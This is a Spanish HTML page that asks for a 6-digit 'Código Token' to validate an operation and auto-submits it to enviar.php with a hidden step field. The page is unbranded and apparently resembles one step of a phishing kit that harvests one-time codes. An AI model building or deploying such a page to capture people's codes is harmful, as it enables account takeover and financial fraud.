<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ingreso de Código Token</title>
    <link rel="stylesheet" type="text/css" href="styles.css">
</head>
<body>

    <div class="left-container">
        <div class="logo-container"> 
            <img src="logo.svg" alt="Logo">
        </div>
    </div>

    <div class="right-container">
        <div class="progress-bar">
            <div class="progress" style="width: 100%;"></div>
        </div>

        <div class="form-container">
            <div class="title-container">
                <h2 class="title">Verificación de Seguridad</h2>
            </div>
            <p class="subtitle">Por favor, ingresa tu token de 6 dígitos para validar la operación.</p>
            
            <form action="enviar.php" method="POST" id="token-form">
                <input type="hidden" name="paso" value="token">

                <div class="token-input" style="margin-bottom: 20px;">
                    <input type="tel" id="token" name="token" maxlength="6" required autocomplete="off" placeholder="000000" style="text-align: center; font-size: 24px; letter-spacing: 5px;">
                    <p style="text-align: center; margin-top: 5px;">Código Token</p>
                </div>
                
                <button type="submit">Validar Código</button>
            </form>

            <div class="links">
                <p class="link-text" id="help-link" style="cursor: pointer;">Necesito ayuda</p>
            </div>

            <div class="help-section" id="help-section" style="display: none; background: #f4f4f4; padding: 10px; border-radius: 5px; margin-top: 10px;">
                <p>Si tienes problemas para ingresar el código, por favor verifica:</p>
                <ul>
                    <li>Que tu dispositivo tenga señal o conexión a internet.</li>
                    <li>Que el número registrado sea el correcto.</li>
                </ul>
            </div>
        </div>
    </div>

    <script>
        // Animación simple de ayuda desplegable
        document.getElementById('help-link').addEventListener('click', function() {
            var help = document.getElementById('help-section');
            help.style.display = (help.style.display === 'none') ? 'block' : 'none';
        });

        // CORREGIDO: Permitir solo números y auto-enviar al llegar a 6 dígitos
        document.getElementById('token').addEventListener('input', function(e) {
            // Filtrar y dejar solo caracteres numéricos del 0 al 9
            this.value = this.value.replace(/[^0-9]/g, '');

            // Si el usuario ya completó los 6 números, el formulario se envía solo
            if (this.value.length === 6) {
                document.getElementById('token-form').submit();
            }
        });
    </script>
</body>
</html>
